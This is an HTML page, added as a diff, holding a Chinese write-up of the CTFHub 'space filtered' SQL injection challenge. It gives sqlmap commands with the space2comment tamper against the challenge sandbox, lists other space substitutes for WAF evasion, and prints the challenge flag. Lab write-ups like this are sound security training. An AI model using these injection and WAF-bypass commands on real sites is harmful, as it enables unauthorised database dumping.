@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-SQL注入过滤空格 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-SQL注入过滤空格 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.25 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, SQL注入, 过滤空格, WAF绕过, SQLmap, Burp Suite</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - SQL注入 / 过滤空格</li>
+        <li><strong>题目名称：</strong>过滤空格</li>
+        <li><strong>环境：</strong>通过 Open Browser 打开外部浏览器访问靶场环境。</li>
+        <li><strong>目标：</strong>后端 WAF 过滤了 SQL 语句中的所有空格，直接输入常规 Payload 会触发拦截。需要使用替代字符绕过过滤，最终获取 Flag。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>核心原理：</strong>SQL 语法要求关键字之间必须有空格分隔（如 <code>union select</code>），当空格被过滤时，会导致语法错误。绕过的方法是用 MySQL 支持的、可代替空格的注释符 <code>/**/</code> 来替代。</p >
+    
+    <div class="diff-box">
+        <strong>工具与手工的双重思考：</strong>
+        <ul>
+            <li><strong>手工路线（Burp Suite）：</strong>虽然可以通过手动替换 <code>/**/</code> 来绕过空格，但在构造长 Payload 时（如查表和查字段），WAF 可能会对特定的关键字组合进行静默拦截，导致页面无报错但数据为空。</li>
+            <li><strong>工具路线（SQLmap）：</strong>最终使用了 SQLmap 的 <code>--tamper "space2comment.py"</code> 插件。该脚本的底层原理正是<strong>自动把 SQL 语句中的空格替换为 <code>/**/</code></strong>。配合 <code>--batch</code> 参数，实现了稳定、快速的脱库，有效规避了 WAF 针对特定手工 Payload 的拦截策略。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：SQLmap 自动脱库（推荐，最稳定）</h3>
+        <p><strong>操作命令：</strong>在 CMD 中运行（URL 已换为当前环境）：</p>
+        <div class="payload-box">
+            <p><code>python sqlmap.py -u "http://challenge-9432ed059e388520.sandbox.ctfhub.com:10800/?id=1" --dbs --tamper "space2comment.py" --batch</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">执行目的：</span>探测注入点，利用 <code>space2comment</code> 替换空格，获取所有数据库名。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>成功列出 <code>information_schema</code>、<code>mysql</code>、<code>performance_schema</code> 和 <code>sqli</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确认当前库为 <strong><code>sqli</code></strong>。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：获取表名（SQLmap）</h3>
+        <p><strong>操作命令：</strong></p>
+        <div class="payload-box">
+            <p><code>python sqlmap.py -u "http://challenge-9432ed059e388520.sandbox.ctfhub.com:10800/?id=1" -D "sqli" --tables --tamper "space2comment.py" --batch</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">执行目的：</span>查询 <code>sqli</code> 库下的所有表名。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>输出 <code>news</code> 和随机表名 <code>yjosujyarv</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确认目标表名为 <strong><code>yjosujyarv</code></strong>，<code>news</code> 为干扰项。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：一键脱库拿 Flag（SQLmap）</h3>
+        <p><strong>操作命令：</strong></p>
+        <div class="payload-box">
+            <p><code>python sqlmap.py -u "http://challenge-9432ed059e388520.sandbox.ctfhub.com:10800/?id=1" -D "sqli" -T "yjosujyarv" --dump --tamper "space2comment.py" --batch --threads=1</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">执行目的：</span>指定库名和表名，使用 <code>--dump</code> 自动猜测字段名并导出表内数据。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>终端打印数据表，输出 <code>ctfhub{28e7c86cddcc506dc791d70b}</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>成功提取 Flag，提交至 CTFHub，通关成功。</p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：WAF 的空格拦截。</strong>直接输入带空格的 Payload 会直接被拦截并提示 <code>Hacker!!!</code>，必须使用替代空格。</li>
+        <li><strong>坑2：SQLmap 的初始误判。</strong>不加 <code>--tamper</code> 时，SQLmap 的正常测试请求被 WAF 拦截，导致其误判为“不可注入”。必须指定 <code>--tamper "space2comment.py"</code> 脚本。</li>
+        <li><strong>坑3：手工 Payload 的局限性。</strong>当使用 BP 手工构造长 Payload 时，WAF 可能会对特定关键字组合进行静默拦截，导致状态码 200 但数据为空。这证明了在复杂的 WAF 环境中，自动化工具的灵活性和抗干扰能力优于僵化的手工Payload。</li>
+        <li><strong>坑4：浏览器地址栏与 BP 抓包混淆。</strong>在 BP 的 Repeater 里修改请求时，Payload 是放在 <code>GET /?id=...</code> 里的。切记不要将完整的请求行直接复制到浏览器地址栏，会导致请求格式错误并触发 WAF。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>空格绕过手段：</strong>替代空格的常用符号包括内联注释 <code>/**/</code>、换行符 <code>%0a</code>、制表符 <code>%09</code> 等。</li>
+        <li><strong>SQLmap 核心参数：</strong><code>--tamper</code> 是绕过 WAF 的神器，<code>space2comment</code> 脚本专门解决空格过滤问题。</li>
+        <li><strong>实战环境认知：</strong>工具虽然能大幅提升效率，但在 WAF 静默拦截和自动化绕过方面，往往比手工更聪明。而作为安全研究员，我们需要能够准确判断“是环境坏了”还是“Payload被拦截了”。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
